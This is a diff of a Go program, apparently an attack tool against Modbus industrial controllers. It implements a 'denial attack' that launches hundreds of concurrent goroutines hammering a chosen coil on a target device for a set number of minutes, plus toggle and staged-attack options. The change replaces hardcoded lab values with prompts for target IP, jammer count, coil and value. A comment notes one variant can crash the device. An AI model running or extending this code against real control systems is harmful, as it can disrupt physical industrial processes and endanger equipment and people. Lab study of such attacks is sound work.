@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"sync"
 	"time"
 
@@ -51,23 +50,22 @@ func jammer(target modbus.Client, coil uint16, coil_value int) {
 			if err != nil {
 				fmt.Println(err)
 				fmt.Println(results)
-				fmt.Print("I am in the jammer")
 			}
 		}
 	}
 }
 
 func denial(ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
+	client := modbusConnection(ip_address)
 	for i := 0; i < jamming; i++ {
 		wait.Add(1)
-		go jammer(modbusConnection(ip_address), uint16(coil), coil_val)
+		go jammer(client, uint16(coil), coil_val) //If you use modbusConnection(ip_address) instead of client you can crash the pi
 	}
 
 	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
 	go func() {
 		<-timer2.C
 		fmt.Println("Denial attack completed")
-		os.Exit(0)
 	}()
 	wait.Wait()
 }
@@ -95,40 +93,40 @@ func main() {
 	for {
 		var userSelection int
 
-		fmt.Println("Enter 1) For denial attack 2) Toggle 3) Stage an attack")
+		fmt.Println("Enter: \n 1) For denial attack \n 2) Toggle \n 3) Stage an attack")
 		fmt.Scanln(&userSelection)
 
 		if userSelection == 1 {
-			// var ip_address string
-			// fmt.Println("Enter an ip address")
-			// fmt.Scanln(&ip_address)
+			var ip_address string
+			fmt.Println("Enter an ip address")
+			fmt.Scanln(&ip_address)
 
-			// var jamming int
-			// fmt.Println("Enter a number of jammers")
-			// fmt.Scanln(&jamming)
+			var jamming int
+			fmt.Println("Enter a number of jammers")
+			fmt.Scanln(&jamming)
 
-			// var runtime int
-			// fmt.Println("Enter a runtime:")
-			// fmt.Scanln(&runtime)
+			var runtime int
+			fmt.Println("Enter a runtime:")
+			fmt.Scanln(&runtime)
 
-			// var coil uint16
-			// fmt.Println("Enter a coil:")
-			// fmt.Scanln(&coil)
+			var coil uint16
+			fmt.Println("Enter a coil:")
+			fmt.Scanln(&coil)
 
-			// var coil_value int
-			// fmt.Println("Enter a coil value:")
-			// fmt.Scanln(&coil_value)
+			var coil_value int
+			fmt.Println("Enter a coil value:")
+			fmt.Scanln(&coil_value)
 
-			//denial(ip_address, jamming, runtime, coil, coil_value)
-			go denial("192.168.13.86", 500, 1, 0, 0)
+			go denial(ip_address, jamming, runtime, coil, coil_value)
+			//go denial("192.168.13.86", 500, 1, 0, 0)
 		} else if userSelection == 2 {
-			// var ip_address string
-			// fmt.Println("Enter an ip address")
-			// fmt.Scanln(&ip_address)
+			var ip_address string
+			fmt.Println("Enter an ip address")
+			fmt.Scanln(&ip_address)
 
-			// var coil uint16
-			// fmt.Println("Enter a coil:")
-			// fmt.Scanln(&coil)
+			var coil uint16
+			fmt.Println("Enter a coil:")
+			fmt.Scanln(&coil)
 
 			var coil_value int
 			fmt.Println("Enter a coil value:")
